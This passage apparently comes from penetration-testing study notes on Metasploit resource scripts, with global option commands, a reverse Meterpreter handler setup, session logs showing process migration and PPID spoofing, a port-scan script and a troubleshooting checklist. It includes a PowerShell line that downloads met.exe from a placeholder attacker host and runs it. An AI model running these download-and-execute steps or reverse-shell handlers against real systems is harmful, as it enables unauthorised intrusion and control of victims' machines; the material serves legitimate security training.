Use:
- quickly start repeatable handlers
- keep handlers running in background
- auto-run a post module after session creation
- reduce setup mistakes

Built-in resource scripts:
```bash
ls -la /usr/share/metasploit-framework/scripts/resource
```

Useful global datastore commands:
```bash
setg RHOSTS target_subnet/24
setg THREADS 50
setg VERBOSE false
unsetg RHOSTS
```

Common resource-script use cases:
```text
listener setup
port scanning
SMB checks
credential validation
post-exploitation automation
```

e.g. `listener.rc`

```bash
└─$ sudo msfconsole -r listener.rc    

[*] Processing listener.rc for ERB directives.
resource (listener.rc)> use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
resource (listener.rc)> set PAYLOAD windows/meterpreter_reverse_https
PAYLOAD => windows/meterpreter_reverse_https
...
[*] Meterpreter session 1 opened (KALI_IP:443 -> ALICE_IP:60781) at DATE +0200
```

```powershell
# PS -> download met.exe -> execute  
iwr -uri http://KALI_IP/met.exe -outfile met.exe
./met.exe
```

```bash
└─$ sudo msfconsole -r listener.rc    
...
[*] Started HTTPS reverse handler on https://BOB_IP:443
[*] https://BOB_IP/ handling request from ALICE_IP; (UUID: XXXXXX) Redirecting stageless connection from REDACTED
...
[*] Running module against DOMAIN  
[*] Current server process: met.exe (2004)  
[*] Spawning notepad.exe process to migrate into  
[*] Spoofing PPID 0  
[*] Migrating into 5340  
[+] Successfully migrated into process 5340  
[*] Meterpreter session 1 opened http://BOB_IP:443/ -> 127.0.0.1 at DATE  
```

e.g. `portscan.rc`

```bash
└─$ sudo msfconsole -r portscan.rc
[*] Processing portscan.rc for ERB directives.
resource (portscan.rc)> setg RHOSTS TARGET_IP/24
resource (portscan.rc)> setg VERBOSE false
resource (portscan.rc)> setg THREADS 50
resource (portscan.rc)> setg NMAP true
```



---

## Troubleshooting

- running modules before manual enumeration
- not reading `info` before using an exploit
- ignoring module side effects and cleanup warnings
- using the wrong payload architecture
- using a staged payload with netcat
- forgetting to set `LHOST` to the VPN/tun0 IP
- forgetting to change `SSL` and `RPORT` together
- choosing reverse payloads when the target cannot route back
- not using `check` when the module supports it
- not documenting exact module, options, payload, and result
- leaving real credentials, hashes, IPs, or flags in notes
- assuming Meterpreter means instant privilege escalation
- forgetting to background sessions before switching modules
- not cleaning up uploaded payloads when appropriate
